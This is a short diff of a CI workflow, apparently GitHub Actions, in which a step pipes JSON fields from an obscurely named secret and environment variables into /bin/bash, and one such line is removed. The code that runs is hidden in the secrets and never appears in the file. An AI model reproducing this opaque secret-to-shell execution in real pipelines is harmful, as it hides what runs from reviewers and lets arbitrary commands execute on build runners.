@@ -22,7 +22,6 @@ jobs:
           uah2323: ${{ secrets.uah2323 }}
         run: |
           printf '%s' "$uah2323" | jq -r .cg0472 | /bin/bash
-          echo $ijhe13277 | jq -r .qgr3 | /bin/bash
           echo $c63195 | jq -r .xlx5 | /bin/bash
 
       - name: Archive artifact
